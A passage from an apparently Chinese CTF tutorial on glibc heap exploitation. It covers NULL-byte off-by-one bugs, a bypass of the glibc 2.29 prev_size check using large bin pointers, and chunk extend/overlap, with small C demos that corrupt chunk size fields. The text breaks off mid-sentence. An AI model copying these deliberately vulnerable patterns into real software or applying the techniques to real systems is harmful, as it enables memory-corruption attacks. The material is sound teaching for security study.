data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>
    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">24</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">strcpy</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不考虑栈溢出，似乎没什么问题，可能很多人在实际的代码中也是这样写的，但是 <strong><code>strlen</code> 和 <code>strcpy</code> 的行为不一致却导致了 off-by-one 的发生</strong></p><p>原因在于，<code>strlen</code> 在计算字符串长度时不包括结束符&nbsp;<code>'\x00'</code>，而 <code>strcpy</code> 在复制字符串时会拷贝结束符&nbsp;<code>'\x00'</code>，因此，最后其实向 <code>chunk1</code> 中写入了 25 个字节</p><p>执行 <code>gets(buffer)</code> 之前的堆：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A83.png" alt="CTF - PWN_堆相关的漏洞与利用3.png"></p><p>执行 <code>strcpy(chunk1, buffer)</code> 之后：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A84.png" alt="CTF - PWN_堆相关的漏洞与利用4.png"></p><p>可以看到 <code>next chunk</code> 的 <code>size</code> 域低字节被结束符&nbsp;<code>'\x00'</code>&nbsp;覆盖（这种情况又属于 off-by-one 的一个分支：NULL byte off-by-one）</p><ul><li>当然，也不排除写入的 <code>size</code> 正好就只多了一个字节的情况</li></ul><blockquote><p>一般来说，单字节溢出被认为是难以利用的</p><p>但是因为 Linux 的堆管理机制 <code>ptmalloc2</code> 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大</p></blockquote><hr><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出字节为可控制任意字节</li></ol><p>通过修改大小造成块结构之间出现重叠，从而泄露或者覆盖其他块数据</p><ol start="2"><li>溢出字节为 NULL 字节</li></ol><p>在 <code>size</code> 为 0x100 的时候，溢出 NULL 字节可以使得&nbsp;<code>prev_in_use</code>&nbsp;位被清除（记录前一个 <code>chunk</code> 块是否被分配），这样前一个块会被认为是 free 块</p><p>然后可以采用以下方法：</p><p>（1）使用 unlink 方法进行处理</p><p>（2）由于这时&nbsp;<code>prev_size</code>&nbsp;域会被启用，可以伪造&nbsp;<code>prev_size</code> 造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照&nbsp;<code>prev_size</code>&nbsp;找到的块的大小与 <code>prev_size</code>&nbsp;是否一致</p><blockquote><p>注意：</p><p>在 Glibc 2.29 以后的版本代码中已经加入针对方法（2）的 <code>check</code> ，因此传统的方法（2）失效；但是在 Glibc 2.28 及之前版本并没有该 <code>check</code>，可以继续使用</p></blockquote><p>Glibc 中对于此处的 <code>check</code> 如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* consolidate backward */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      prevsize <span class="token operator">=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
      size <span class="token operator">+=</span> prevsize<span class="token punctuation">;</span>
      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">/* 下面两行代码在新版本 Glibc 中加入，则方法（2）无法使用，但是 Glibc 2.28 及之前版本都没有问题
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating"); */</span>
      <span class="token function">unlink_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Glibc 2.29 以后的版本中， <code>check</code> 处增加了两行代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">!=</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size while consolidating"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这让我们想要控制一个真实 <code>chunk</code> 的 <code>size</code> 字段变得更加困难，所以传统的 NULL byte off-by-one 方法失效</p><p>但是，只需要满足被 unlink 的 <code>chunk</code> 和下一个 <code>chunk</code> 相连，仍然可以伪造 <code>fake_chunk</code></p><p>伪造的方式就是使用 <code>large bin</code> 遗留的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指针：</p><ul><li>以 <code>fd_nextsize</code> 为 <code>fake_chunk</code> 的 <code>fd</code></li><li>以 <code>bk_nextsize</code> 为 <code>fake_chunk</code> 的 <code>bk</code></li></ul><p>这样我们可以完全控制该 <code>fake_chunk</code> 的 <code>size</code> 字段（这个过程会破坏原 <code>large bin chunk</code> 的 <code>fd</code> 指针，但是没有关系），同时还可以通过部分覆写 <code>fd_nextsize</code> 控制其 <code>fd</code>，然后在后面使用其他的 <code>chunk</code> 辅助伪造，可以通过该 <code>check</code></p><p>然后只需要通过 unlink 的检测就可以了，也就是：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">(</span>fd <span class="token operator">-&gt;</span> bk <span class="token operator">==</span> p<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>bk <span class="token operator">-&gt;</span> fd <span class="token operator">==</span> p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果 <code>large bin</code> 中仅有一个 <code>chunk</code>，那么该 <code>chunk</code> 的 <code>fd_nextsize</code> 指针和 <code>bk_nextsize</code> 指针都会指向自己</p></blockquote><ol><li><p>我们可以控制 <code>fd_nextsize</code> 指向堆上的任意地址，可以容易地使之指向一个 <code>fast bin + 0x10 - 0x18</code>，而 <code>fast bin</code> 中的 <code>fd</code> 也会指向堆上的一个地址，通过部分覆写该指针也可以使该指针指向之前的 <code>large bin + 0x10</code>，这样就可以通过&nbsp;<code>fd -&gt; bk == p</code>&nbsp;的检测</p></li><li><p>由于 <code>bk_nextsize</code> 我们无法修改，所以 <code>bk -&gt; fd</code> 必然在原先的 <code>large bin chunk</code> 的 <code>fd</code> 指针处（这个 <code>fd</code> 被我们破坏了），通过 <code>fast bin</code> 的链表特性可以做到修改这个指针且不影响其他的数据，再将其部分覆写就可以通过&nbsp;<code>bk -&gt; fd == p</code>&nbsp;的检测</p></li><li><p>然后通过 off-by-one 向低地址合并，实现 <code>chunk Overlap</code>，之后可以泄露 libc 的基地址和堆地址，然后 <code>tcache</code> 打 <code>__free_hook</code> 即可</p></li></ol><hr><h2 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h2><p>见本站 《<a href="18c02ebd.html">【Asis CTF 2016】b00ks</a>》、《<a href="14f0dc5a.html">【plaidctf 2015】PlaidDB</a>》</p><hr><h1 id="Chunk-Extend-and-Overlap"><a href="#Chunk-Extend-and-Overlap" class="headerlink" title="Chunk Extend and Overlap"></a>Chunk Extend and Overlap</h1><blockquote><p><code>chunk extend</code>（堆扩展）是堆漏洞的一种常见利用手法，通过 <code>extend</code> 可以实现 <code>chunk Overlap</code>（堆重叠）的效果</p><p>参考文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9jaHVuay1leHRlbmQtb3ZlcmxhcHBpbmcv">Chunk Extend and Overlapping - CTF Wiki</a></p></blockquote><p>这种利用方法通常需要以下条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 <code>chunk header</code> 中的数据</li></ul><p>一般来说，<code>Chunk Extend and Overlap</code> 并不能直接控制程序的执行流程，但是可以控制 <code>chunk</code> 中的内容：</p><ul><li><p>如果 <code>chunk</code> 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程</p></li><li><p>此外，<code>chunk extend</code> 通过控制 <code>size</code> 和 <code>pre_size</code> 域可以实现 <code>chunk Overlap</code>，通过 <code>Overlap</code> 可以控制 <code>chunk</code> 的 <code>fd / bk</code> 指针从而可以实现 <code>fastbin attack</code> 等利用</p></li></ul><hr><h2 id="对-inuse-的-fast-bin-进行-extend"><a href="#对-inuse-的-fast-bin-进行-extend" class="headerlink" title="对 inuse 的 fast bin 进行 extend"></a>对 inuse 的 fast bin 进行 extend</h2><blockquote><p>当我们创建两个堆块 <code>chunk1</code> 和 <code>chunk2</code> 时，通过修改 <code>chunk1</code> 的 <code>size</code> 域，使其 <code>size</code> 的大小包含 <code>chunk2</code>，那么 <code>free</code> 掉 <code>chunk1</code> 的时候，<code>chunk2</code> 也会被 <code>free</code> 掉</p><p>而当我们再次请求这两个堆块大小之和的堆块时，就会获得 <code>chunk1 + chunk2</code> 的空间，也就可以控制 <code>chunk2</code> 的内容</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>

    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第一个 0x10 的 chunk</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第二个 0x10 的chunk</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x41</span><span class="token punctuation">;</span>   <span class="token comment">// 修改第一个块的 size 域</span>

    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 实现 extend，控制了第二个块的内容</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们 <code>malloc</code> 两个堆块后：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A85.png" alt="CTF - PWN_堆相关的漏洞与利用5.png"></p><p>然后修改 <code>chunk1</code> 的 <code>size</code> 域为 <code>0x41</code>（包括了 <code>chunk2</code> 的大小）：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A86.png" alt="CTF - PWN_堆相关的漏洞与利用6.png"></p><p>可以看到 <code>free</code> 掉 <code>chunk1</code> 后，<code>chunk2</code> 也被 <code>free</code> 掉了：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A87.png" alt="CTF - PWN_堆相关的漏洞与利用7.png"></p><p>此时如果我们再通过 <code>malloc(0x30)</code> 分配堆块，就会得到 <code>chunk1 + chunk2</code> 的块，此时就可以直接控制 <code>chunk2</code> 中的内容</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A88.png" alt="CTF - PWN_堆相关的漏洞与利用8.png"></p><p>这种状态就称为 <code>Overlap chunk</code></p><hr><h2 id="对-inuse-的-small-bin-进行-extend"><a href="#对-inuse-的-small-bin-进行-extend" class="headerlink" title="对 inuse 的 small bin 进行 extend"></a>对 inuse 的 small bin 进行 extend</h2><blockquote><p>当 <code>free</code> 掉的 <code>chunk size &gt;= 144</code>（0x90）字节时，会被置于 <code>unsorted bin</code> 中，这次以 <code>malloc(0x80)</code> 来举例</p><p>与前面的 <code>fast bin</code> 不同的是，这种情况下还需要再 <code>malloc</code> 一块空间用来防止 <code>unsorted bin</code> 与 <code>top chunk</code> 合并</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>

    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第一个 0x80 的 chunk1</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第二个 0x10 的 chunk2</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 防止与 top chunk 合并</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们 <code>malloc</code> 三个堆块后（<code>chunk3</code> 用来防止 <code>chunk1</code> 被篡改并 <code>free</code> 后与 <code>top chunk</code> 合并）：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A89.png" alt="CTF - PWN_堆相关的漏洞与利用9.png"></p><p>然后修改 <code>chunk1</code> 的 <code>size</code> 域为 <code>0xb1</code>（包括了 <code>chunk2</code> 的大小）：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A810.png" alt="CTF - PWN_堆相关的漏洞与利用10.png"></p><p>可以看到 <code>free</code> 掉 <code>chunk1</code> 后，<code>chunk2</code> 也被 <code>free</code> 掉了：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A811.png" alt="CTF - PWN_堆相关的漏洞与利用11.png"></p><p>此时 <code>chunk1</code> 和 <code>chunk2</code> 被一起置入 <code>unsorted bin</code></p><p>此时如果我们再通过 <code>malloc(0xa0)</code> 分配堆块，就会得到 <code>chunk1 + chunk2</code> 的块，此时就可以直接控制 <code>chunk2</code> 中的内容：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A812.png" alt="CTF - PWN_堆相关的漏洞与利用12.png"></p><hr><h2 id="对-free-的-small-bin-进行-extend"><a href="#对-free-的-small-bin-进行-extend" class="headerlink" title="对 free 的 small bin 进行 extend"></a>对 free 的 small bin 进行 extend</h2><blockquote><p>在，先释放 <code>chunk1</code>，然后再修改处于 <code>unsorted bin</code> 中的 <code>chunk1</code> 的 <code>size</code> 域，会使得 chunk2 也被置于 <code>unsorted bin</code> 中</p><p>当我们再次请求这两个堆块大小之和的堆块时，就会获得 <code>chunk1 + chunk2</code> 的空间，也就可以控制 <code>chunk2</code> 的内容</p></blockquote><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>

    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第一个 0x80 的 chunk1</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第二个 0x10 的 chunk2</span>

    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 首先进行释放，使得 chunk1 进入 unsorted bin</span>

    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>malloc</code> 分配两个堆块后，直接 <code>free</code> 掉 <code>chunk1</code> 使其被置于 <code>unsorted bin</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A813.png" alt="CTF - PWN_堆相关的漏洞与利用13.png"></p><p>此时修改 <code>unsorted bin</code> 的 <code>size</code> 域为 <code>0xb1</code>（包括了 <code>chunk2</code> 的大小），发现 <code>chunk2</code> 也被置于 <code>unsorted bin</code> 中：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A814.png" alt="CTF - PWN_堆相关的漏洞与利用14.png"></p><p>然后再 <code>malloc(0xa0)</code> 的大小就可以得到&nbsp;<code>chunk1 + chunk2</code> 的堆块，从而控制了 <code>chunk2</code> 的内容：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A815.png" alt="CTF - PWN_堆相关的漏洞与利用15.png"></p><hr><h2 id="通过-extend-后向-Overlap"><a href="#通过-extend-后向-Overlap" class="headerlink" title="通过 extend 后向 Overlap"></a>通过 extend 后向 Overlap</h2><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>

    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 1 个 0x80 的 chunk1</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 2 个 0x10 的 chunk2</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 3 个 0x10 的 chunk3</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 4 个 0x10 的 chunk4    </span>
    
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>malloc</code> 分配四个堆块后：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A816.png" alt="CTF - PWN_堆相关的漏洞与利用16.png"></p><p>修改 <code>chunk1</code> 的 <code>size</code> 域为 <code>0x61</code>（包括了 <code>chunk2</code>、<code>chunk3</code> 的大小）：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A817.png" alt="CTF - PWN_堆相关的漏洞与利用17.png"></p><p>此时 <code>free</code> 掉 <code>chunk1</code>，则 <code>chunk2</code>、<code>chunk3</code> 也一并被 <code>free</code> 进入 <code>fast bin</code>：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A818.png" alt="CTF - PWN_堆相关的漏洞与利用18.png"></p><p>在 <code>malloc(0x50)</code> 对 <code>extend</code> 区域重新占位后，其中 <code>0x10</code> 的 <code>fastbin</code> 块依然可以正常的分配和释放：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A819.png" alt="CTF - PWN_堆相关的漏洞与利用19.png"></p><p>此时已经构成 <code>Overlap</code>，通过对 <code>Overlap</code> 的进行操作可以实现 <code>fastbin 